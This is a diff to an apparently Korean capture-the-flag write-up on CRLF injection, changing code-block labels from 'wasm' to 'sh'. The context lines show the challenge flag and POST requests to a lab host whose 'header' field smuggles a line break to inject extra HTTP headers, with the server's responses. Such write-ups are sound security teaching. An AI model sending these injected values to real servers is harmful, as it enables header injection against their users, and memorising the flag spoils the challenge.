@@ -509,7 +509,7 @@ K0{CRLF_is_very_common_vulnerability}
 
 ### 2-1. post 요청 - header, value
 
-```wasm
+```sh
 POST / HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
@@ -517,7 +517,7 @@ Content-Type: application/x-www-form-urlencoded
 header=header1&value=value1
 ```
 
-```wasm
+```sh
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.3 Python/3.10.12
 Date: Mon, 16 Sep 2024 12:39:23 GMT
@@ -535,7 +535,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 ### 2-2. 헤더 두 개 설정
 
-```wasm
+```sh
 POST / HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
@@ -544,7 +544,7 @@ header=header1: value1
 header2&value=value2
 ```
 
-```wasm
+```sh
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.3 Python/3.10.12
 Date: Mon, 16 Sep 2024 12:17:25 GMT
@@ -563,7 +563,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 ### 2-3. 헤더를 본문으로 인식
 
-```wasm
+```sh
 POST / HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
@@ -573,7 +573,7 @@ header=header1: value1
 header2&value=value2
 ```
 
-```wasm
+```sh
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.3 Python/3.10.12
 Date: Mon, 16 Sep 2024 12:18:48 GMT
@@ -604,7 +604,7 @@ header=header1: value1
 header2&value=value2
 ```
 
-```wasm
+```sh
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.3 Python/3.10.12
 Date: Mon, 16 Sep 2024 12:20:38 GMT
@@ -636,7 +636,7 @@ header=header1: value1
 header2&value=value2
 ```
 
-```wasm
+```sh
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.3 Python/3.10.12
 Date: Mon, 16 Sep 2024 12:21:02 GMT
